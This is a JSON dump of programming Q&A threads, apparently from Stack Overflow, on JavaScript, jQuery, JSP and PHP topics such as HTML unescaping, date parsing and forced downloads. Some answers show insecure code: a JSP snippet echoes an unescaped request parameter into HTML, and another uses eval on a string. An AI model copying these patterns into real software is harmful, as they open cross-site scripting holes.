                    "body": "<p>You could use something like the <a href=\"http://www.prototypejs.org/api/string/unescapeHTML\"><code>unescapeHTML()</code></a> function in prototype...</p>\n\n<p>Adapted from <a href=\"http://www.prototypejs.org/\">prototype js</a> source</p>\n\n<pre><code>function unescapeHTML(escapedHTML) {\n  return escapedHTML.replace(/&amp;lt;/g,'&lt;').replace(/&amp;gt;/g,'&gt;').replace(/&amp;amp;/g,'&amp;');\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>assign it to variable:  </p>\n\n<pre><code>var text = $(\"#edit\").val();\ntext = text.replace(\"&amp;lt;\",\"&lt;\");\n</code></pre>\n\n<p>this will work fine</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Hey all, I basically output content into a div like this using jquery:</p>\n\n<pre><code>var text = $(\"#edit\").val();\n$(\"#output\").text(text);\n</code></pre>\n\n<p>But I want to turn \"&amp;lt;\" and \"&amp;gt;\" into \"&lt;\" and \">\". </p>\n\n<p><code>text.replace(/&amp;lt;/,\"&lt;\");</code> doesn't seem to be working for me...</p>\n\n<p>Any ideas? Many thanks</p>\n",
            "last_activity_date": 1409059703,
            "question_id": 5302037,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "replace"
            ],
            "title": "javascript string replace &amp;lt; into &lt;"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>If you want to check if file exists using javascriot then no, as far as I know, javascript has no access to file system due to security reasons..\nBut as for me it is not clear enough what are you trying to do..</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Javascript cannot access the filesystem and check for existence. The only interaction with the filesystem is with loading js files and images (png/gif/etc). </p>\n\n<p><strong>Javascript is not the task for this</strong></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Fortunately, it's not possible (for security reasons) to access client-side filesystem with standard JS. Some proprietary solutions exist though (like Microsoft's IE-only ActiveX component). </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Your question is ambiguous, so there are multiple possible answers depending on what you're really trying to achieve.</p>\n\n<p>If you're developping as I'm guessing a desktop application using Titanium, then you can use the FileSystem module's getFile to get the file object, then check if it exists using the exists method.</p>\n\n<p>Here's an example taken from the Appcelerator website:</p>\n\n<pre><code>var homeDir = Titanium.Filesystem.getUserDirectory();\nvar mySampleFile = Titanium.Filesystem.getFile(homeDir, 'sample.txt');\n\nif (mySampleFile.exists()) {\n    alert('A file called sample.txt already exists in your home directory.');\n    ...\n}\n</code></pre>\n\n<p>Check the <a href=\"http://developer.appcelerator.com/apidoc/desktop/latest/Titanium.Filesystem.getFile-method\">getFile method reference documentation</a></p>\n\n<p>And the <a href=\"http://developer.appcelerator.com/apidoc/desktop/latest/Titanium.Filesystem.File-object.html\">exists method reference documentation</a></p>\n\n<p><strong>For those who thought that he was asking about an usual Web development situation, then thse are the two answers I'd have given:</strong></p>\n\n<p>1) you want to check if a server-side file exists. \nIn this case you can use an ajax request try and get the file and react upon the received answer. Although, be aware that you can only check for files that are exposed by your web server. A better approach would be to write a server-side script (e.g., php) that would do the check for you, given a filename and call that script via ajax. Also, be aware that you could very easily create a security hole in your application/server if you're not careful enough.</p>\n\n<p>2) you want to check if a client-side file exists. \nIn this case, as pointed you by others, it is not allowed for security reasons (although IE allowed this in the past via ActiveX and the Scripting.FileSystemObject class) and it's fine like that (nobody wants you to be able to go through their files), so forget about this.</p>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>Since 'Kranu' helpfully advises 'The only interaction with the filesystem is with loading js files . . .', that suggests doing so with error checking would at least tell you if the file does <em>not</em> exist - which may be sufficient for your purposes?</p>\n\n<p>From a <strong>local</strong> machine, you can check whether a file does <strong><em>not exist</em></strong>  by attempting to load it as an external script then checking for an error.  For example:</p>\n\n<pre><code>&lt;span&gt;File exists? &lt;/span&gt;\n&lt;SCRIPT&gt;\n    function get_error(x){\n        document.getElementsByTagName('span')[0].innerHTML+=x+\" does not exist.\";\n    }\n    url=\"   (put your path/file name in here)    \";\n    url+=\"?\"+new Date().getTime()+Math.floor(Math.random()*1000000);\n    var el=document.createElement('script');\n    el.id=\"123\";\n    el.onerror=function(){if(el.onerror)get_error(this.id)}\n    el.src=url;\n    document.body.appendChild(el);\n&lt;/SCRIPT&gt;\n</code></pre>\n\n<p>Some notes... </p>\n\n<ul>\n<li>append some random data to the file name (url+=\"?\"+new Date etc) so that the browser cache doesn't serve an old result.</li>\n<li>set a unique element id (el.id=) if you're using this in a loop, so that the get_error function can reference the correct item.</li>\n<li>setting the onerror (el.onerror=function) line is a tad complex because one needs it to call the get_error function AND pass el.id - if just a normal reference to the function (eg: el.onerror=get_error) were set, then no el.id parameter could be passed.</li>\n<li>remember that this only checks if a file <strong><em>does not</em></strong> exist.</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>An alternative:\nyou can use a \"hidden\" applet element which implements this exist-check using a privileged action object and override your run method by:</p>\n\n<pre><code>File file = new File(yourPath);\nreturn file.exists();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You can use this</p>\n\n<pre><code>function LinkCheck(url)\n{\n    var http = new XMLHttpRequest();\n    http.open('HEAD', url, false);\n    http.send();\n    return http.status!=404;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I want to check if a file exists locally, where the HTML file is located. It has to be Javascript. Javascript will never be disabled. jQuery is not good but can do.</p>\n\n<p>Any answers are appreciated.</p>\n\n<p>by the way, I am making a titanium app for Mac so I am looking for a way of protecting my files from people who click \"show package contents\".</p>\n",
            "last_activity_date": 1391162117,
            "question_id": 5115141,
            "score": 4,
            "tags": [
                "javascript",
                "html",
                "security",
                "titanium"
            ],
            "title": "Check if a file exists locally using javascript ONLY"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>If the problem is indeed that your script runs too early, perhaps checking and waiting until the DOM is ready is the solution: <a href=\"http://www.javascriptkit.com/dhtmltutors/domready.shtml\" rel=\"nofollow\">Relying on DOM readiness to invoke a function (instead of window.onload)</a></p>\n\n<p><strong>Edit</strong></p>\n\n<p><a href=\"http://stackoverflow.com/questions/1206937/javascript-domready\">This answer on SO</a> might also prove to be useful.</p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>You can always write a little function that checks to see if the function is loaded</p>\n\n<pre><code>function waitForFnc(){\n  if(typeof absearch == \"undefined\"){\n    window.setTimeout(waitForFnc,50);\n  }\n  else{\n    runMyFunction();\n  }\n}\n\nfunction runMyFunction(){\n    var urlParams = window.location.search.substring(1).split('&amp;'),\n        username = \"\",\n        hscEmailInput = document.getElementById('userfield6'),\n        i = 0;\n    if (urlParams !== \"\") {\n        for (i = 0; i &lt; urlParams.length; i++) {\n            if (urlParams[i].substr(0,4) === \"USER\") {\n                username = urlParams[i].replace('USER=', '');\n                hscEmailInput.value = username + '@example.com';\n                absearch('&amp;PAGESIZE=1');\n            }\n        }\n    }\n}\n\nwaitForFnc();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>This is not a matter of timing.</p>\n\n<p>You're bumping into Greasemonkey's security restrictions, which prevent you from executing functions in the page. Please see my answer to this previous question for an explanation and some safe workarounds:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/5006460/userscripts-greasemonkey-calling-a-websites-javascript-functions\">UserScripts & Greasemonkey: calling a website's JavaScript functions</a></p>\n",
                    "is_accepted": true,
                    "score": 5
                }
            ],
            "body": "<p>[<strong>Edit:</strong> I'm replacing the original, confusing question with a simplified example demonstrating the problem.]</p>\n\n<p><strong>Background</strong></p>\n\n<p>I'm trying to write a userscript which will run in Chrome. This script needs to call a JavaScript function <code>AlertMe()</code> that is outside of the userscript -- this function is part of the page and contains variables that are generated dynamically on the server-side, so it isn't possible to re-write this function in my userscript.</p>\n\n<p><strong>Code</strong></p>\n\n<p>Script on the page (<a href=\"http://martinsmucker.com/demo/alertme.html\" rel=\"nofollow\">visit the page</a>):</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    function AlertMe()\n    {\n        alert(\"Function AlertMe was called!\");\n        // then do stuff with strings that were dynamically generated\n        // on the server so that I can't easily rewrite this into the userscript\n    }\n&lt;/script&gt;\n</code></pre>\n\n<p>My userscript (<a href=\"http://martinsmucker.com/demo/martinsmucker.user.js\" rel=\"nofollow\">install it in Chrome</a>):</p>\n\n<pre><code>function tryAlert()\n{\n    if (typeof AlertMe == \"undefined\") {\n        console.log('AlertMe is undefined.');\n        window.setTimeout(tryAlert, 100);\n    }\n    else {\n        AlertMe();\n    }\n}\n\ntryAlert();\n</code></pre>\n\n<p><strong>The Problem</strong></p>\n\n<p>When I tried to simply call the function, Chrome's console let me know that <code>AlertMe is not defined</code>. Thinking that this was because my userscript was running before all other scripts had been loaded, I used <code>setTimeout</code> to wait for the <code>AlertMe</code> function to become defined. </p>\n\n<p>Unfortunately, if you install the script then visit the page, you'll see that this just outputs <code>AlertMe is undefined.</code> forever and never calls the function.  If you type <code>typeof AlertMe</code> into Chrome's console, it will correctly respond with <code>\"function\"</code>, so why is it that my userscript always thinks that <code>AlertMe</code> is undefined?</p>\n",
            "last_activity_date": 1298482737,
            "question_id": 5092726,
            "score": 4,
            "tags": [
                "javascript",
                "google-chrome",
                "userscripts"
            ],
            "title": "Make my userscript wait for other scripts to load"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Maybe someone else has a better way, but you could try this:</p>\n\n<p><strong>Example:</strong> <a href=\"http://jsfiddle.net/aAueA/1/\" rel=\"nofollow\">http://jsfiddle.net/aAueA/1/</a></p>\n\n<pre><code>var input = document.getElementsByTagName('input')[0];\n\ninput.onkeypress = input.onkeydown = function() {\n    this.size = ( this.value.length &gt; 10 ) ? this.value.length : 10;\n};\n</code></pre>\n\n<p>This sets it at a minimum size of 10 and expands if you go beyond 10 characters.</p>\n\n<p>Probably works best with a fixed width font:</p>\n\n<pre><code>input {\n    font-family:Courier;\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 4
                },
                {
                    "body": "<p>Let the browser do the calculating of the width by using a <code>div</code> with <code>contenteditable</code> set to <code>true</code>.</p>\n\n<pre><code>&lt;div class=\"pseudo-input\" contenteditable=\"true\"&gt;Resizes to my content!&lt;/div&gt;\n</code></pre>\n\n<p>There should be no issues with browser support <a href=\"http://caniuse.com/#feat=contenteditable\">http://caniuse.com/#feat=contenteditable</a></p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>You can also create div element, copy your input style to it and use it's dimensions to resize input. (Chosen multiple uses <a href=\"https://github.com/harvesthq/chosen/blob/master/coffee/chosen.jquery.coffee#L479-L502\" rel=\"nofollow\">this solution</a>).</p>\n\n<pre><code>var input = $('input'),\n    dummy = $('&lt;div style=\"position:absolute; left: -1000%;\"&gt;').appendTo('body');\n\n['font-size', 'font-style', 'font-weight', 'font-family',\n 'line-height', 'text-transform', 'letter-spacing'].forEach(function(index) {\n    dummy.css(index, input.css(index));\n});\n\ninput.on('input', function() {\n   dummy.html(this.value);\n   input.width(dummy.width());\n});\n</code></pre>\n\n<p>UPD: better to use pre instead div to follow spaces size.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I do not care for a specific technology, it could be JS, CSS or even some unstandard and evil html attributes. I just want the <code>input</code> to get bigger if user types over the right border.</p>\n",
            "last_activity_date": 1411549487,
            "question_id": 4663716,
            "score": 4,
            "tags": [
                "javascript",
                "html",
                "css"
            ],
            "title": "Resize input to fit its content"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I think this a <code>microtime</code>. Similar to <a href=\"http://php.net/manual/en/function.microtime.php\" rel=\"nofollow\">PHP's microtime</a> function. Or in <code>new Date().getTime()</code> in JavaScript.</p>\n\n<pre><code>// PHP\n$ php -r \"var_dump(microtime(true));\"\nfloat(1292963152.1249)\n\n// JavaScript\nnew Date().getTime()\n1292963411830\n</code></pre>\n",
                    "is_accepted": false,
                    "score": -2
                },
                {
                    "body": "<p>This is what I call an \"Microsoft Date\" and the following function will convert the encoded date to a javascript date time</p>\n\n<pre><code>            var msDateToJSDate = function(msDate) {\n                var dtE = /^\\/Date\\((-?[0-9]+)\\)\\/$/.exec(msDate);\n                if (dtE) {\n                    var dt = new Date(parseInt(dtE[1], 10));\n                    return dt;\n                }\n                return null;\n            }\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>The number is a timestamp with millisecond resolution. This number can be passed to JavaScript's <code>Date</code> class' constructor. All that is needed is some code to extract it from the string:</p>\n\n<pre><code>var dateString = \"/Date(1292962456255)/\";\nvar matches = dateString.match(/^\\/Date\\((\\d+)\\)\\/$/);\nvar date = new Date(parseInt(matches[1], 10));\n</code></pre>\n\n<p>The regexp on the second line gets a bit messy since the string contains /, ( and ) at precisely the positions that they are needed in the regexp (are you sure what you have is strings that look like that, and not a description of a pattern that would extract them?).</p>\n\n<p>Another way of doing it is to use <code>eval</code>:</p>\n\n<pre><code>var dateString = \"/Date(1292962456255)/\";\nvar date = eval(\"new \" + dateString.substring(1, dateString.length - 1));\n</code></pre>\n\n<p>but that may open up for an XSS attack, so I don't recommend it.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Check out <a href=\"http://momentjs.com/\" rel=\"nofollow\">moment.js</a>! It's \"A lightweight javascript date library for parsing, manipulating, and formatting dates\". It is a really powerful little library.</p>\n\n<p>Here's an example...</p>\n\n<pre><code>var today = moment(new Date());\ntoday.format(\"MMMM D, YYYY h:m A\");        // outputs \"April 11, 2012 2:32 PM\"\n\n// in one line...\nmoment().format(\"MMMM D, YYYY h:m A\");     // outputs \"April 11, 2012 2:32 PM\"\n</code></pre>\n\n<p>Here's another example...</p>\n\n<pre><code>var a = moment([2012, 2, 12, 15, 25, 50, 125]);\na.format(\"dddd, MMMM Do YYYY, h:mm:ss a\"); // \"Monday, March 12th 2012, 3:25:50 pm\"\na.format(\"ddd, hA\");                       // \"Mon, 3PM\"\na.format(\"D/M/YYYY\");                      // \"12/3/2012\"\n</code></pre>\n\n<hr>\n\n<p>Also, its worth mentioning to checkout <a href=\"http://www.datejs.com/\" rel=\"nofollow\">date.js</a>. I think the two libraries complement each other.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>How to format this:</p>\n\n<pre><code>/Date(1292962456255)/\n</code></pre>\n\n<p>as regular looking date in JavaScript/jQuery?</p>\n",
            "last_activity_date": 1346364492,
            "question_id": 4503504,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "json"
            ],
            "title": "Format Date in Javascript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>No. clearTimeout only needs to be called if you want to stop a pending setTimeout from happening. After the setTimeout happens, the timer id is no longer valid but fortunately calling clearTimeout with an invalid timer id is harmless.</p>\n\n<p>If you see memory leaks happening the problem is somewhere else.</p>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>There are times when setTimeout can cause memory leaks... see the following article: <a href=\"http://www.makemineatriple.com/2007/10/passing-parameters-to-a-function-called-with-settimeout\" rel=\"nofollow\">setTimeout memory leaks</a></p>\n\n<p>Be warned that IEx has a garbage-collector subtlety, though; I think that if you reference a DOM variable in a Javascript closure, then the collection mechanism gets confused and it doesn't get trashed at the end of the request: eventually this becomes a memory leak. I think it's because DOM variables and internal JS variables get collected by two different collectors, and they don't communicate properly about what's no longer being used.</p>\n\n<p>I think you can fix this by setting the variable to null:</p>\n\n<pre><code>setTimeout(function(){\n    myFunction(parameter); \n    parameter = null\n}, myTimeout);\n</code></pre>\n\n<p>This explicitly sets the garbage collection in motion.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>After calling <code>setTimeout</code>, is there memory leak issue without calling <code>clearTimeout</code>?</p>\n\n<p>Thanks.</p>\n",
            "last_activity_date": 1348475376,
            "question_id": 4244309,
            "score": 4,
            "tags": [
                "javascript"
            ],
            "title": "Is there memory leak issue if not calling clearTimout after calling setTimeout"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Have you tried using the Javascript interpreter that ships with JDK 6 (Rhino)?</p>\n\n<p>I mean, shipping with the core JDK is pretty interoperable, if you ask me. You can access Java services from the Javascript context, and from the Java side it's possible to introduce objects into the Javascript global context.  It's also possible (with the ScriptEngine stuff) to use Javascript code as implementation of a Java interface.</p>\n\n<p>Now, it's not at all interoperable with the CLR of course.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>JavaScript compilers have shipped in\nthe MS CLI implementation from the beginning,\nand in the Sun Java implementation since 1.6.0.</p>\n\n<p>MS's is efficient, current, and uses DLR, so it interoperates\nwith other implementaitons of dynamic languages, such as IronPython.</p>\n\n<p>Sun's is based on the otherwise-abandoned 1998 Mozilla \"Rhino\".\nIf you must have consistency or must have open source,\nyou can run Rhino on MS .net   via IKVM.</p>\n\n<p>For more details, see:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/398809/is-there-a-port-of-the-rhino-javascript-engine-for-net\">Is there a port of the Rhino JavaScript engine for .NET</a></p>\n\n<p>The web browser wars have led to their JS implementations (in C++)\nbeing radically faster &amp; more up-to-date than all others.\nMozilla's TraceMonkey has no Java bindings.\nBut Google's V8 (Chrome, Android; faster anyway) does.</p>\n\n<p>If you're prepared for some pain:</p>\n\n<p><a href=\"http://code.google.com/p/jav8/\" rel=\"nofollow\">http://code.google.com/p/jav8/</a></p>\n\n<p><a href=\"http://rbackhouse.blogspot.com/2011/03/using-google-v8-javascript-engine-in.html\" rel=\"nofollow\">http://rbackhouse.blogspot.com/2011/03/using-google-v8-javascript-engine-in.html</a></p>\n\n<p>Or you can use MessagePack RPC to call into node.js (Google V8).</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Due to the huge resources behind it, Javascript seems to rapidly becoming the scripting language of choice for applications, particularly those with a web front end.  I have an application that requires extensibility both on the front and backend. Javascript, or a thin wrapper like CoffeeScript, seems like an excellent, future-oriented, choice.  </p>\n\n<p>The problem I'm having with using Javascript as the target is interoperability with existing server side libraries. V8 requires custom C++ code.  I'd much prefer to leverage the vast resources of the JDK/.NET class libraries and our code that exposes APIs to these languages.</p>\n\n<p>Are there any robust efforts that would allow users to call JVM/CLR libraries from Javascript, similar to the elegance of the IronPython-CLR and Jython-JVM link?</p>\n\n<p>The alternative is to use something like IronPython/Jython, but both projects have only a fraction of the resources devoted to Javascript and it makes client-side extensibility story very difficult.</p>\n\n<p>Has anybody successfully confronted similar issues?</p>\n",
            "last_activity_date": 1339805757,
            "question_id": 3926788,
            "score": 4,
            "tags": [
                "javascript",
                "jvm",
                "clr",
                "v8"
            ],
            "title": "Javascript engine with good interoperability with JVM and CLR"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>What happens when a browser sees a link is not dependent on the link, but rather on the target of the link. Your web server should send the appropriate header: <code>Content-Disposition: attachment;filename=\"file.xml\"</code> to tell the browser that it should prompt to save the file instead of displaying it.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It depends on what the client computer does with XML files. If you doubleclick on a XML file, it will open in your browser probably.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Yeah, there is.  It does require specifying some headers.  Exactly how it works depends on what language you're using, but here's an example using php, taken off of php.net:</p>\n\n<pre><code>&lt;?php\n// We'll be outputting a PDF\nheader('Content-type: application/pdf');\n\n// It will be called downloaded.pdf\nheader('Content-Disposition: attachment; filename=\"downloaded.pdf\"');\n\n// The PDF source is in original.pdf\nreadfile('original.pdf');\n?&gt;\n</code></pre>\n\n<p>Basically, first we tell the client what type of file we're sending, then we tell the client that what we're sending is an attachment, and it's name, instead of it being a page to display, and then finally we print/read the file to the output.</p>\n\n<p>Given that you're already using php to generate the xml file, I would suggest adding the header commands above to the code that generates the xml file, and see if that does the trick.</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p><strong>download.php:</strong></p>\n\n<pre><code>header('Content-Type: text/xml');\nheader('Content-Disposition: attachment; filename=\"file.xml\"');\nreadfile('/path/to/file.xml');\n</code></pre>\n\n<p><strong>HTML:</strong></p>\n\n<pre><code>&lt;a href=\"download.php\"&gt;Download&lt;/a&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>If you happen to be using Apache for your web server, and you always want to force downloading of XML files, there is a more efficient way to do what @chigley suggested. Just add the following to a <code>.htaccess</code> file.</p>\n\n<pre><code>&lt;Files *.xml&gt;\nForceType application/xml\nHeader set Content-Disposition attachment\n&lt;/Files&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Basically I wrote a script that generates a xml file based on user input. After the file is generated a download link appears like so:</p>\n\n<pre><code>&lt;a href=\"path/to/file.xml\"&gt;Download File&lt;/a&gt;\n</code></pre>\n\n<p>But when clicked it opens the xml in the browser, I want it to start downloading when the link it clicked instead. Is there any way to achieve that?</p>\n",
            "last_activity_date": 1410917338,
            "question_id": 3841578,
            "score": 4,
            "tags": [
                "php",
                "javascript",
                "html"
            ],
            "title": "Is there a way to force the user to download a file from a href link rather than to open it in a browser window?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Just print it as if it is a JavaScript variable. E.g.</p>\n\n<pre><code>var foo = '${foo}';\n</code></pre>\n\n<p>This will print the result of <code>String.valueOf(pageContext.findAttribute(\"foo\"))</code> to the response and end up being the value of a JavaScript variable. The webbrowser will retrieve like this:</p>\n\n<pre><code>var foo = 'somevalue';\n</code></pre>\n\n<p>You also see that those singlequotes are mandatory for JavaScript, not for Java/JSP.</p>\n\n<h3>See also:</h3>\n\n<ul>\n<li><a href=\"http://balusc.blogspot.com/2009/05/javajspjsf-and-javascript.html\">Communication between Java/JSP/JSF and JavaScript</a></li>\n</ul>\n\n<hr>\n\n<p><strong>Update</strong>: some may suggest to use an ugly and old fashioned <em>scriptlet</em> for this, e.g. <code>&lt;%= request.getAttribute(\"foo\") %&gt;</code>. Its use is however strongly  <a href=\"http://stackoverflow.com/questions/3177733/howto-avoid-java-code-in-jsp-files\">discouraged</a> since over a decade. You should perefer taglibs and EL over <em>scriptlets</em>. Also, as per the comments, when it concerns user-controlled input, you'd like to escape it to avoid XSS attacks:</p>\n\n<pre><code>&lt;%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %&gt;\n...\n\nvar foo = '${fn:escapeXml(foo)}';\n</code></pre>\n\n<h3>See also:</h3>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/2658922/xss-prevention-in-java/2658941#2658941\">XSS prevention in Java</a></li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>If you're pre-populating the form fields based on parameters in the HTTP request, then why not simply do this on the server side in your JSP... rather than on the client side with JavaScript?  In the JSP it would look vaguely like this:</p>\n\n<pre><code>&lt;input type=\"text\" name=\"myFormField1\" value=\"&lt;%= request.getParameter(\"value1\"); %&gt;\"/&gt;\n</code></pre>\n\n<p>On the client side, JavaScript doesn't really have the concept of a \"request object\".  You pretty much have to parse the query string yourself manually to get at the CGI parameters.  I suspect that isn't what you're actually wanting to do.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I have a form in jsp. I have to populate it based on the request object (from the servlet). How do i use Java Script for accessing request object attributes or if you can suggest me any other better way to populate form dynamically?</p>\n",
            "last_activity_date": 1285865727,
            "question_id": 3832792,
            "score": 4,
            "tags": [
                "java",
                "javascript",
                "jsp",
                "servlets"
            ],
            "title": "Access request object in JavaScript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>The confusion arises because the text representation of the output isn't the best way to understand recursion. The number of discs isn't \"going up\", rather it's <code>hanoi(1)</code> that continues to run once <code>hanoi(0)</code> is done.</p>\n\n<p>I've created a modified example at <a href=\"http://jsbin.com/owefi4/2\">JSBin</a> that prints the output in a (somewhat) prettier way with spaces. Only the \"moves\" actually do anything, the rest of the lines are just recursive calls to solve smaller sub-problems in order to tackle the entire problem later.</p>\n\n<p>You might also want to have a look at this <a href=\"http://www.cut-the-knot.org/recurrence/hanoi.shtml\">Java applet</a> that graphically shows how the algorithm works - this might be easier to understand.</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Towers of Hanoi is an excellent example of how recursion can simplify a given problem. The idea is as follows: you have to move N disks from a source stack to a destination stack, one disk at a time and you can never put a smaller disk on a larger one. You can use an auxiliary stack. Let's say N = 10. You have no idea how to solve it. But you can make the problem simpler (you hope):  </p>\n\n<pre><code>move 9 disks to the auxiliary stack,  \nmove the remaining (and largest!) disk to the destination stack, and  \nmove the 9 disks from the auxiliary stack to the destination stack  \n</code></pre>\n\n<p>Again, you have no idea how to move a 9 disk stack, but that's no problem either:  </p>\n\n<pre><code>move 8 disks from the auxiliary stack to the source stack,  \nmove the remaining disk to the destination stack (there are 2 disks now), and  \nmove the 8 disks from the source stack to the destination stack  \n</code></pre>\n\n<p>Repeat this until the stack you have to move is only 1 disk big.  </p>\n\n<p>About the number of disks going up again: you call the function recursively for N-1 disks, which in the function is assigned to N. This N only exists until the function ends, and returns to the previous level. Then you get the old value of N again.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>At the moment I'm reading Douglas Crockford's book, and the towers of hanoi function is a bit over my head. Even with logging stuff to the console I wasn't able to really understand what's going on. Here's the function with my additions:</p>\n\n<pre><code>var hanoi = function (disc, src, aux, dst) {\n  console.log(disc);\n  console.log(src, dst);    \n  if (disc &gt; 0) {\n    hanoi(disc - 1, src, dst, aux);\n    console.log('Move disc ' + disc + ' from ' + src + ' to ' + dst);\n    hanoi(disc - 1, aux, src, dst);\n  }\n}\n\nhanoi(3, 'Src', 'Aux', 'Dst');\n</code></pre>\n\n<p>This results in the following:</p>\n\n<blockquote>\n  <p>3<br>\n  Src Dst<br>\n  2<br>\n  Src Aux<br>\n  1<br>\n  Src Dst<br>\n  0<br>\n  Src Aux<br>\n  Move disc 1 from Src to Dst<br>\n  0<br>\n  Aux Dst<br>\n  Move disc 2 from Src to Aux<br>\n  1<br>\n  Dst Aux<br>\n  0<br>\n  Dst Src<br>\n  Move disc 1 from Dst to Aux<br>\n  0<br>\n  Src Aux<br>\n  Move disc 3 from Src to Dst<br>\n  2<br>\n  Aux Dst<br>\n  1<br>\n  Aux Src<br>\n  0<br>\n  Aux Dst<br>\n  Move disc 1 from Aux to Src<br>\n  0<br>\n  Dst Src<br>\n  Move disc 2 from Aux to Dst<br>\n  1<br>\n  Src Dst<br>\n  0<br>\n  Src Aux<br>\n  Move disc 1 from Src to Dst<br>\n  0<br>\n  Aux Dst</p>\n</blockquote>\n\n<p>And I'm lost at an early point. At line 6 of the results, how can it go back from Src Aux to Src Dst?</p>\n\n<p>And how can the number of discs go up again once it has reached 0, when the function is only calling itself using \"disc - 1\"?</p>\n",
            "last_activity_date": 1424398138,
            "question_id": 3742305,
            "score": 4,
            "tags": [
                "javascript",
                "recursion",
                "towers-of-hanoi"
            ],
            "title": "Crockford&#39;s hanoi function (from &quot;The Good Parts&quot;)"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can use inline images</p>\n\n<p>on server side encode your response in base64</p>\n\n<p>in php use <code>base64_encode(\"your data\")</code><br>\nand in javascript</p>\n\n<pre><code>result = document.getElementById('results');\nresult.innerHTML = '&lt;img src=\"data:image/gif;base64,' + xmlhttp.responseText + '\"/&gt;';\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Seems like the easiest thing to do would be to set up a local proxy service that you can access via a GET and URL parameters, and on the back end it does the POST to the original image service, receives the image data back, and passes it back to you. Then you just put the URL of your proxy (with parameters) into the img src attribute.</p>\n\n<pre><code>&lt;img src=\"http://myproxy/foo.jpg?param1=bar&amp;param2=baz\" /&gt;\n</code></pre>\n\n<p>The proxy at myproxy POSTs a request to the image servlet accordingly.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Do you have to use Ajax?  Why not just add an image to your DOM?  When I type the following code in to my debugger in chromium it appends the PHP logo to the current page:</p>\n\n<pre><code>document.body.appendChild(document.createElement('img')).setAttribute('src', 'http://static.php.net/www.php.net/images/php.gif');\n</code></pre>\n\n<p>?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>W3C is working on <a href=\"http://www.w3.org/TR/FileAPI/\" rel=\"nofollow\">File API</a> and <a href=\"http://www.w3.org/TR/2010/WD-XMLHttpRequest2-20100907/\" rel=\"nofollow\">XMLHttpRequest Level 2</a> to provide a unified experience with Blob for your requirement. You may want to investigate if any existing browser has implemented this feature.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
